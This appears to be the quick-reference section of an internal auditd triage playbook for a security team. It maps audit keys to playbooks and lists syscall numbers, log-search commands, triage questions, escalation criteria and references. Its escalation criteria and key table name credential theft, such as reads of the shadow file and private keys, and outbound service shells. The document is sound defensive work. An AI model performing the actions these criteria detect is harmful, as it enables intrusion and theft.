### Key to playbook

| Key or record | Playbook | First question |
| --- | --- | --- |
| `process_creation` (service account, shell) | A | What is the parent, and does it connect out? |
| `actions`, `etcpasswd`, `etcgroup`, `ADD_USER` | B | Which program changed it, and is there a ticket? |
| `cron`, `systemd`, `init`, `rootkey`, `sshd`, `shell_profiles`, `systemwide_preloads` | C | What does the new entry run, and from where? |
| `CONFIG_CHANGE`, `DAEMON_END`, `auditconfig`, `auditlog`, timestomp | D | What happened just before? |
| `unauthedfileaccess`, `tracing`, credential paths in command lines | E | Did it succeed, and what came next? |

### Syscall numbers (64-bit x86 only)

| Number | Syscall | Number | Syscall |
| --- | --- | --- | --- |
| 59 | `execve` | 42 | `connect` |
| 322 | `execveat` | 101 | `ptrace` |
| 257 | `openat` | 319 | `memfd_create` |
| 90 | `chmod` | 313 | `finit_module` |

### Commands

| Need | Command |
| --- | --- |
| Decode hex in a shell | `echo <hex> \| xxd -r -p \| tr '\0' ' '` |
| One event, readable | `ausearch -i --event <serial>` |
| One key, today | `ausearch -i -k <key> -ts today` |
| One user, recent | `ausearch -i -ua <auid> -ts recent` |
| Is auditing healthy? | `auditctl -s` (look at `enabled` and `lost`) |
| What rules are live? | `auditctl -l` |

### Seven triage questions

1. Stitch and decode.
2. Who (`auid` vs `uid`/`euid`)?
3. What (`exe`, command, `cwd`, files)?
4. What launched it (`ppid`, `ses`, login source)?
5. Was it expected (ticket, config management, patching)?
6. How far does it go (same user, same command, other hosts, outbound)?
7. Decide and record a specific reason.

**Escalate now:** service shell that connects out or downloads; audit stopped or rules deleted; shadow file or private keys read; new UID 0 or `NOPASSWD` without a ticket. **Always** sanitise before pasting logs anywhere outside the SIEM.

## References and resources

### auditd itself

- [auditd(8)](https://man7.org/linux/man-pages/man8/auditd.8.html), [auditctl(8)](https://man7.org/linux/man-pages/man8/auditctl.8.html), [ausearch(8)](https://man7.org/linux/man-pages/man8/ausearch.8.html), [aureport(8)](https://man7.org/linux/man-pages/man8/aureport.8.html) and [audit.rules(7)](https://man7.org/linux/man-pages/man7/audit.rules.7.html): the manual pages for the daemon, rule syntax and search tools.
- [Red Hat: Auditing the system (RHEL 9)](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/security_hardening/auditing-the-system_security-hardening): the clearest vendor walkthrough of records, fields and tools.
- [Linux audit field dictionary](https://github.com/linux-audit/audit-documentation/blob/main/specs/fields/field-dictionary.csv) and [record type dictionary](https://github.com/linux-audit/audit-documentation/blob/main/specs/messages/message-dictionary.csv): authoritative meanings for every field and `type=`.
- [Linux syscall table (x86\_64)](https://filippo.io/linux-syscall-table/): look up a `syscall=` number.
- [Laurel](https://github.com/threathunters-io/laurel): turns auditd records into one decoded JSON event, if we ever change collection.

### SIEM

- [Microsoft Sentinel: Syslog via AMA](https://learn.microsoft.com/en-us/azure/sentinel/connect-cef-syslog-ama): how Linux logs reach the `Syslog` table.
- KQL functions used here: [extract](https://learn.microsoft.com/en-us/kusto/query/extract-function), [replace\_regex](https://learn.microsoft.com/en-us/kusto/query/replace-regex-function), [url\_decode](https://learn.microsoft.com/en-us/kusto/query/url-decode-function).
- [Splunk Add-on for Unix and Linux](https://splunkbase.splunk.com/app/833): source of the `linux_audit` sourcetype and field extractions.
- [SigmaHQ auditd rules](https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd): community detections to compare against our analytics.

### Threat context

- [MITRE ATT&CK Linux matrix](https://attack.mitre.org/matrices/enterprise/linux/): every technique mapped in the playbooks.
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team): safe, documented tests for validating detections in a lab.
- [CyberChef](https://gchq.github.io/CyberChef/): GCHQ's tool for decoding hex and other encodings.

### UK guidance

- [NCSC: Introduction to logging for security purposes](https://www.ncsc.gov.uk/guidance/introduction-logging-security-purposes) and [10 Steps: Logging and monitoring](https://www.ncsc.gov.uk/collection/10-steps/logging-and-monitoring).
- [ICO: Report a breach](https://ico.org.uk/for-organisations/report-a-breach/) (UK GDPR, 72 hours).
- [NCSC: Report an incident](https://report.ncsc.gov.uk/).
- [GOV.UK: Cyber Security and Resilience Bill incident reporting factsheet](https://www.gov.uk/government/publications/deleted-cyber-security-and-resilience-network-and-information-systems-bill-factsheets/incident-reporting).
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks): the Linux benchmarks' audit sections are a useful coverage checklist for our rules.
